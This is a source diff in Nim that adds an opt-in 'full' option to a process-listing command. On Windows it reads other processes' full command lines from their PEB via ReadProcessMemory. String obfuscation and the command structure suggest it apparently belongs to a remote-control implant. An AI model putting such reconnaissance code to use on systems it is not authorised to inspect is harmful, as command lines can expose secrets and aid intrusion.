@@ -20,7 +20,88 @@ type
 when defined(windows):
   import winim
   import std/widestrs
-  
+
+  # ---- PEB reader (opt-in via `-full`): local type + ntdll binding so we
+  # ---- don't depend on winim/winternl exposing PROCESS_BASIC_INFORMATION.
+  type
+    PROCESS_BASIC_INFO_LOCAL {.pure.} = object
+      Reserved1: pointer
+      PebBaseAddress: pointer
+      Reserved2a: pointer
+      Reserved2b: pointer
+      UniqueProcessId: pointer
+      Reserved3: pointer
+
+  when sizeof(pointer) == 8:
+    type
+      UNICODE_STR_LOCAL {.pure.} = object
+        Length: uint16
+        MaximumLength: uint16
+        Padding: uint32
+        Buffer: pointer
+    const
+      PEB_OFFSET_PARAMS = 0x20
+      PARAMS_OFFSET_CMDLINE = 0x70
+  else:
+    type
+      UNICODE_STR_LOCAL {.pure.} = object
+        Length: uint16
+        MaximumLength: uint16
+        Buffer: pointer
+    const
+      PEB_OFFSET_PARAMS = 0x10
+      PARAMS_OFFSET_CMDLINE = 0x40
+
+  proc NtQueryInformationProcess(ProcessHandle: HANDLE,
+                                 ProcessInformationClass: DWORD,
+                                 ProcessInformation: pointer,
+                                 ProcessInformationLength: ULONG,
+                                 ReturnLength: ptr ULONG): LONG
+    {.stdcall, importc, dynlib: "ntdll.dll".}
+
+  proc getProcessCommandLine(pid: DWORD): string =
+    ## Pull a process's full command line from its PEB via ReadProcessMemory.
+    ## Returns "" on access denied, bitness mismatch (WoW64 edges), or any
+    ## other failure — never raises.
+    let hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, 0, pid)
+    if hProcess == 0:
+      return ""
+    defer: CloseHandle(hProcess)
+
+    var pbi: PROCESS_BASIC_INFO_LOCAL
+    var retLen: ULONG = 0
+    if NtQueryInformationProcess(hProcess, 0.DWORD, addr pbi,
+                                 ULONG(sizeof(pbi)), addr retLen) != 0:
+      return ""
+    if pbi.PebBaseAddress.isNil:
+      return ""
+
+    # Read ProcessParameters pointer out of the remote PEB.
+    var paramsRemote: pointer = nil
+    var br: SIZE_T = 0
+    let pebParamsAddr = cast[pointer](cast[uint](pbi.PebBaseAddress) + PEB_OFFSET_PARAMS.uint)
+    if ReadProcessMemory(hProcess, pebParamsAddr, addr paramsRemote,
+                         SIZE_T(sizeof(pointer)), addr br) == 0:
+      return ""
+    if paramsRemote.isNil:
+      return ""
+
+    # Read CommandLine UNICODE_STRING out of ProcessParameters.
+    var us: UNICODE_STR_LOCAL
+    let cmdLineAddr = cast[pointer](cast[uint](paramsRemote) + PARAMS_OFFSET_CMDLINE.uint)
+    if ReadProcessMemory(hProcess, cmdLineAddr, addr us,
+                         SIZE_T(sizeof(us)), addr br) == 0:
+      return ""
+    if us.Length.int == 0 or us.Length.int > 32768 or us.Buffer.isNil:
+      return ""
+
+    var buf = newSeq[uint16]((us.Length.int div 2) + 1)
+    if ReadProcessMemory(hProcess, us.Buffer, addr buf[0],
+                         SIZE_T(us.Length), addr br) == 0:
+      return ""
+    buf[buf.high] = 0
+    result = $cast[WideCString](addr buf[0])
+
   proc getProcessUser(hProcess: HANDLE): string =
     ## Get the user associated with a process
     var hToken: HANDLE = 0
@@ -64,16 +145,16 @@ when defined(windows):
     else:
       result = name
   
-  proc getProcessListWindows(): seq[ProcessEntry] =
+  proc getProcessListWindows(includeCommandLine: bool): seq[ProcessEntry] =
     result = @[]
-    
+
     var pe32: PROCESSENTRY32W
     pe32.dwSize = sizeof(PROCESSENTRY32W).DWORD
-    
+
     let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     if hSnapshot == INVALID_HANDLE_VALUE:
       return
-    
+
     if Process32FirstW(hSnapshot, addr pe32) != 0:
       while true:
         var entry: ProcessEntry
@@ -84,13 +165,17 @@ when defined(windows):
         entry.user = ""
         entry.bin_path = ""
         entry.command_line = ""
-        
+
         # Open process to query information
         let hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pe32.th32ProcessID)
         if hProcess != 0:
           # Get user
           entry.user = getProcessUser(hProcess)
           CloseHandle(hProcess)
+
+        # Opt-in: pull full command line from the remote PEB.
+        if includeCommandLine:
+          entry.command_line = getProcessCommandLine(pe32.th32ProcessID)
         
         # Try to get module path
         let hModSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID)
@@ -111,7 +196,10 @@ when defined(windows):
 when not defined(windows):
   import std/[os, strutils, osproc]
   
-  proc getProcessListLinux(): seq[ProcessEntry] =
+  proc getProcessListLinux(includeCommandLine: bool): seq[ProcessEntry] =
+    # Linux always fills command_line from /proc/[pid]/cmdline, so the flag
+    # is accepted for interface parity but doesn't change behavior.
+    discard includeCommandLine
     result = @[]
     
     # Read /proc directory
@@ -183,13 +271,22 @@ when not defined(windows):
 
 proc ps*(params: string): JsonNode =
   debug "[DEBUG] Getting process list"
-  
+
+  var includeCommandLine = false
+  if params.len > 0:
+    try:
+      let parsed = parseJson(params)
+      if parsed.kind == JObject and parsed.hasKey(obf("full")):
+        includeCommandLine = parsed[obf("full")].getBool(false)
+    except CatchableError:
+      discard
+
   try:
     when defined(windows):
-      let processes = getProcessListWindows()
+      let processes = getProcessListWindows(includeCommandLine)
       let platform = "Windows " & hostCPU
     else:
-      let processes = getProcessListLinux()
+      let processes = getProcessListLinux(includeCommandLine)
       let platform = "Linux " & hostCPU
     
     # Create JSON array for processes
